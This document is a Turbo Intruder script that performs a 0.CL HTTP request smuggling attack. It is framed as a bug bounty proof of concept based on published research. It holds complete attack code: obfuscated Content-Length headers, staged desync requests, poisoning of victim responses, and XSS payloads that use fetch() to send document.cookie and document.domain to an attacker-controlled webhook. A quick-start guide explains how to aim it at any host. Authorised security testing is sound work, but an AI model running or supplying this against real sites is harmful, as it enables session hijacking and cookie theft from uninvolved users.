# Universal 0.CL Request Smuggling Script for Turbo Intruder
# Based on research by James Kettle: https://portswigger.net/research/http1-must-die
# Simplified XSS PoC with webhook callback for bug bounty hunting

# ============================================================================
# CONFIGURATION - Customize these for your target
# ============================================================================

CONFIG = {
    # Target configuration
    'target_host': 'vulnerable-website.com',
    'target_port': 443,
    'use_https': True,
    
    # Webhook for XSS callback (use Burp Collaborator, webhook.site, interact.sh, etc.)
    'webhook_url': 'https://YOUR-WEBHOOK-ID.oastify.com',  # CHANGE THIS!
    
    # Attack vectors - customize for your target
    'gadget_path': '/resources/css/anything',  # Path that triggers early response
    'gadget_method': 'POST',
    
    # Smuggled request configuration
    'smuggled_method': 'GET',
    'smuggled_path': '/admin',  # Target path for smuggled request
    
    # Detection configuration
    'detection_path': '/404',  # Path for detection request
    
    # Engine configuration
    'concurrent_connections': 10,
    'requests_per_connection': 1,
    'timeout': 15,
    'max_retries': 0,
    'attack_iterations': 50,  # Number of attack attempts (set to -1 for infinite)
    
    # Advanced options
    'content_length_obfuscation': 'space',  # Options: space, tab, newline, multiple
    'stage2_method': 'OPTIONS',  # Method for chopped request (OPTIONS, GET, POST)
    'add_cache_buster': True,  # Add random param to avoid caching
}

# ============================================================================
# MAIN ATTACK LOGIC
# ============================================================================

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=CONFIG['concurrent_connections'],
        requestsPerConnection=CONFIG['requests_per_connection'],
        engine=Engine.BURP,
        maxRetriesPerRequest=CONFIG['max_retries'],
        timeout=CONFIG['timeout']
    )
    
    # Validate webhook is configured
    if 'YOUR-WEBHOOK' in CONFIG['webhook_url']:
        raise Exception('Please configure your webhook URL in CONFIG!')
    
    # Build target host string
    host = CONFIG['target_host']
    
    # Build XSS payload with webhook callback
    xss_payload = build_xss_payload()
    
    # Build Content-Length header with obfuscation
    cl_header = build_cl_header(CONFIG['content_length_obfuscation'])
    
    # Stage 1: Early response gadget with obfuscated CL header
    stage1 = build_stage1(host, cl_header)
    
    # Smuggled request: The malicious request with XSS payload
    smuggled = build_smuggled_request(host, xss_payload)
    
    # Stage 2 chopped: Request that gets split
    stage2_chopped = build_stage2_chopped()
    
    # Stage 2 revealed: Completes the chopped request
    stage2_revealed = build_stage2_revealed(host)
    
    # Victim request: Normal request that will be poisoned
    victim = build_victim_request(host)
    
    # Validation
    if '%s' not in stage1:
        raise Exception('Stage1 must contain %s for CL value substitution')
    
    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 must end with blank line (\\r\\n\\r\\n) and have no body')
    
    print(f'[*] Starting 0.CL Request Smuggling attack')
    print(f'[*] Target: {host}')
    print(f'[*] Webhook: {CONFIG["webhook_url"]}')
    print(f'[*] XSS Payload: {xss_payload[:100]}...')
    print(f'[*] Watch your webhook for callbacks!')
    
    # Attack loop
    iteration = 0
    while CONFIG['attack_iterations'] == -1 or iteration < CONFIG['attack_iterations']:
        # Calculate the length for stage2_chopped
        chopped_length = len(stage2_chopped)
        
        # Queue the attack sequence
        engine.queue(stage1, chopped_length, label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        engine.queue(victim, label='victim')
        
        iteration += 1
        
        # Add delay every 30 requests to avoid rate limiting
        if iteration % 30 == 0:
            engine.queue(build_sleep_request(host), label='sleep')
            print(f'[*] Completed {iteration} attack attempts...')


def build_xss_payload():
    """Build XSS payload that calls back to webhook"""
    webhook = CONFIG['webhook_url']
    
    # Multiple payload variations to increase success rate
    # The payload will be injected into User-Agent header
    payloads = [
        f'a"/><script>fetch("{webhook}?xss="+document.domain)</script>',
        f'"/><script>fetch("{webhook}?cookie="+document.cookie)</script><x a="',
        f'Mozilla/5.0"/><script>new Image().src="{webhook}?poc="+document.domain</script><x x="',
        f'a"/><img src=x onerror="fetch(\'{webhook}?xss=success\')">',
    ]
    
    # Use the first payload by default, but you can cycle through them
    return payloads[0]


def build_cl_header(obfuscation_type):
    """Build Content-Length header with various obfuscation techniques"""
    if obfuscation_type == 'space':
        return 'Content-Length : %s'
    elif obfuscation_type == 'tab':
        return 'Content-Length\t: %s'
    elif obfuscation_type == 'newline':
        return 'Content-Length\r\n : %s'
    elif obfuscation_type == 'multiple':
        return 'Content-Length: 0\r\nContent-Length : %s'
    else:
        return 'Content-Length : %s'


def build_stage1(host, cl_header):
    """Build the stage 1 request with early response gadget"""
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        import random
        cache_buster = f'?cb={random.randint(1000, 9999)}'
    
    request = f'''{CONFIG['gadget_method']} {CONFIG['gadget_path']}{cache_buster} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
{cl_header}

'''
    return request


def build_smuggled_request(host, xss_payload):
    """Build the smuggled malicious request with XSS in User-Agent"""
    request = f'''{CONFIG['smuggled_method']} {CONFIG['smuggled_path']} HTTP/1.1
User-Agent: {xss_payload}
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1'''
    
    return request


def build_stage2_chopped():
    """Build the chopped portion of stage 2"""
    request = f'''{CONFIG['stage2_method']} / HTTP/1.1
Content-Length: 123
X: Y'''
    
    return request


def build_stage2_revealed(host):
    """Build the revealed portion that completes stage 2"""
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        import random
        cache_buster = f'?cb={random.randint(1000, 9999)}'
    
    request = f'''GET {CONFIG['detection_path']}{cache_buster} HTTP/1.1
Host: {host}
User-Agent: smuggle-detector
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''
    
    return request


def build_victim_request(host):
    """Build the victim request that will be poisoned"""
    request = f'''GET / HTTP/1.1
Host: {host}
User-Agent: victim-browser
Connection: keep-alive

'''
    
    return request


def build_sleep_request(host):
    """Build a simple request to act as a delay"""
    request = f'''GET / HTTP/1.1
Host: {host}

'''
    
    return request


def handleResponse(req, interesting):
    """Handle responses and detect successful smuggling"""
    table.add(req)
    
    # Focus on victim responses
    if req.label == 'victim':
        response_text = req.response.lower() if req.response else ''
        
        # Look for XSS indicators in response
        xss_indicators = [
            '<script>',
            'onerror=',
            CONFIG['webhook_url'].lower(),
            'fetch(',
            'document.domain',
            'document.cookie'
        ]
        
        for indicator in xss_indicators:
            if indicator in response_text:
                print(f'[+] POTENTIAL XSS! Indicator "{indicator}" found in victim response')
                print(f'[+] Status: {req.status}')
                print(f'[+] Length: {len(req.response)}')
                print(f'[!] CHECK YOUR WEBHOOK FOR CALLBACK!')
                
                # Mark as interesting for further review
                req.interesting = True
                break
        
        # Check for reflected payload in headers or body
        if CONFIG['webhook_url'] in req.response:
            print(f'[+] SUCCESS! Webhook URL reflected in response!')
            print(f'[!] Monitor {CONFIG["webhook_url"]} for XSS callback')
            req.interesting = True
        
        # Check for unusual status codes that might indicate something interesting
        if req.status in [403, 401, 500, 502, 503]:
            print(f'[*] Interesting status {req.status} on victim request')
    
    # Log stage1 and stage2 errors for debugging
    elif req.label in ['stage1', 'stage2']:
        if req.status >= 400 and req.status != 404:
            print(f'[!] Error in {req.label}: Status {req.status}')


# ============================================================================
# USAGE INSTRUCTIONS
# ============================================================================
"""
QUICK START GUIDE:
==================

1. GET A WEBHOOK:
   - Burp Collaborator (Burp Suite Pro): Right-click -> "Copy to clipboard"
   - Free alternatives: webhook.site, interact.sh, pipedream.com
   
2. CONFIGURE:
   - Set 'target_host' to your target domain
   - Set 'webhook_url' to your webhook URL
   - Set 'gadget_path' to a path that returns early (try /static/*, /css/*, /js/*)
   
3. RUN:
   - Load this script in Turbo Intruder
   - Click "Attack"
   - Watch the console output AND your webhook!

4. SUCCESS INDICATORS:
   - Webhook receives a callback with domain name or cookie
   - Console shows "[+] POTENTIAL XSS!" or "[+] SUCCESS!"
   - Victim response contains your webhook URL
   
EXAMPLE WEBHOOK URLS:
- Burp Collaborator: https://abc123.oastify.com
- Webhook.site: https://webhook.site/unique-id
- Interact.sh: https://abc123.interact.sh

TROUBLESHOOTING:
- No callbacks: Try different gadget paths (/resources/*, /static/*)
- Timeouts: Reduce concurrent_connections to 5
- Rate limiting: Reduce attack_iterations or add delays
- No reflection: Try different Content-Length obfuscation types
